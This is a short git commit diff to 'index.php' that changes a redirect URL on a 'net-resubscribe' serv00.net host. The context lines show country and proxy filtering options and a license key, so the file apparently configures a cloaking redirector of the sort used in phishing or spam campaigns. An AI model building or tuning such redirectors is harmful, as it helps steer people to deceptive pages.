46b9de6354157bf3a68f8b5f321eff225f7aed3c
aminemusicbass <aminemusicbass@gmail.com>
2024-12-17 12:08:27 +0100

    Update index.php

--- index.php
+++ index.php
@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://net-resubscribe.serv00.net/optout";
+$redirect = "https://net-resubscribe.serv00.net/xo";
 
 $parameter = 4; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
